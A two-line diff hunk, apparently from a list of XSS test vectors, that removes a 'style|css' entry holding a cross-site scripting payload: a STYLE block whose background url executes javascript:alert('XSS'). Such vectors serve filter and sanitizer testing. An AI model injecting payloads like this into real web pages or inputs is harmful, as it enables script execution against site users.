@@ -1,2 +1,0 @@
-style|css
-<STYLE type="text/css">BODY{background:url("javascript:alert('XSS')")}</STYLE>
